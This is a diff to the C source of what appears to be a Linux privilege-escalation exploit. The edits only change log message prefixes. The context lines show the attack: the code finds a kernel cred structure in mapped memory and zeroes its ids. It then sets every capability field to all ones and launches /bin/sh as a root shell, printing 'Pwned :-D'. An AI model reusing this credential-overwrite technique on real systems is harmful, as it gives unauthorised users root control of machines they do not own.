@@ -92,7 +92,7 @@ int main(int argc, char **argv)
 				addr[credIt++] == uid
 		   ) {
 			credNum++;
-			printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);
+			printf("[.] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);
 
 			credIt = 0;
 			addr[credIt++] = 0; // set all cred struct members to 0 !
@@ -119,7 +119,7 @@ int main(int argc, char **argv)
 				addr[credIt++] = 0xffffffff;
 				addr[credIt++] = 0xffffffff;
 				addr[credIt++] = 0xffffffff;
-				puts("[+] All capabilities set to 1; exec sh; Pwned :-D");
+				puts("[+]  All capabilities set to 1; exec sh; Pwned :-D");
 
 				execl("/bin/sh", "sh", (char *)0);
 				puts("[-] execl /bin/sh failed");
@@ -141,7 +141,7 @@ int main(int argc, char **argv)
 			printf("  loop #%lu addr=%p\n", i, addr); */
 		i ++;
 	} // while()
-	printf("[+] Scanning loop END (i=%d)\n", i);
+	printf("[-] Scanning loop END (i=%d)\n", i);
 
 	//pause();
 	munmap(addr, len);
